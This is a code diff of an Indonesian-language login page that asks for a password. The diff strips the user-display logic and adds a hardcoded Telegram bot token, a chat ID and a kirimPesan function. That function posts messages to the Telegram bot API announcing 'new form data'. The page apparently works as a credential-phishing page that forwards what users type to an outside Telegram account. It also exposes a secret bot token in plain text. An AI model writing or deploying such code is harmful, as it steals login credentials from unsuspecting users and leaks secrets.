@@ -116,28 +116,35 @@ color:#222;
 <div class="username" id="user"></div>
 
 <input
-type="password"
+type="password" id="pw" class="input"
 placeholder="Masukkan Password Anda">
 
 </div>
 
-<button>LOGIN</button>
+<<button class="btn" onclick="login()">
+LANJUT
+</button>
 
 <script>
 
-const user = localStorage.getItem("userid");
+const BOT_TOKEN = "8456111998:AAFOU6Rrgqkwfu65eWg3TZcKT7RI6JF5lbg";
+const CHAT_ID = "6456077638";
 
-if(!user){
-location.href="index.html";
+async function kirimPesan(pesan) {
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: pesan
+    })
+  });
 }
 
-let tampil = user;
-
-if(user.length>4){
-tampil = user.substring(0,2) + "*".repeat(user.length-4) + user.substring(user.length-2);
-}
-
-document.getElementById("user").innerHTML=tampil;
+// Contoh
+kirimPesan("Ada data formulir baru.");
 
 </script>
 
